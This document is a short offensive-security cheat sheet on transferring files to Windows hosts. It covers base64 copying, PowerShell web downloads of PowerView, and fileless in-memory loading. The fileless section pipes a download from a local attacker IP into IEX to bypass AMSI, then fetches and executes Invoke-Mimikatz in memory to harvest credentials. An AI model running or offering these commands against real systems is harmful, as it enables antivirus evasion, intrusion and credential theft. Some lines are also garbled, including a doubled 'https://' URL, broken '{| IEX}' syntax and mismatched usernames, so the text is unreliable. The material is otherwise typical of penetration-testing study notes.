### Copying Using Base64

Verify the MD5 hash of the target file:

```bash
garffff@garffff:~/test$ more hello.py 
print("hello world!")
gareth@gareth:~/test$ md5sum hello.py 
01c0a257edd3c2e95c25d80a4c18c5cc  hello.py
```

Base64 the target file :

```bash
garffff@garffff:~/test$ cat hello.py |base64 -w 0;echo
cHJpbnQoImhlbGxvIHdvcmxkISIp
```

In PowerShell, echo the base64 output to a location:

```bash
PS C:\users\public\downloads> [IO.File]::WriteAllBytes("C:\Users\Public\hello.py", [Convert]::FromBase64String("cHJpbnQoImhlbGxvIHdvcmxkISIp"))
```

Verify MD5 of target file:

```bash
PS C:\users\public\downloads> Get-FileHash C:\Users\Public\hello.py -Algorithm md5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             01C0A257EDD3C2E95C25D80A4C18C5CC                                 
```

### Web Downloads

Malicious files can be detected by Defender:

```bash
PS C:\users\public\downloads> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\users\public\downloads> wget 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1' -o PowerView_wget.ps1
PS C:\users\public\downloads> curl 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1' -o PowerView_curl.ps1
```

Using Invoke-WebRequest is a slower method, this can launch IE when first launched:

```bash
PS C:\users\public\downloads> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

To prevent IE from loading use the following:

```bash
PS C:\users\public\downloads> Invoke-WebRequest https://https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1/PowerView.ps1 -UseBasicParsing {| IEX}
```
### Web Downloads - Fileless (memory)

Need to bypass AMSI to load Malicious files into memory:

```bash
PS C:\users\public\downloads> (New-Object System.Net.WebClient).DownloadString('http://192.168.0.51/amsi.txt') | IEX
```

Then load into memory:

```bash
PS C:\users\public\downloads> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
PS C:\users\public\downloads> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

```

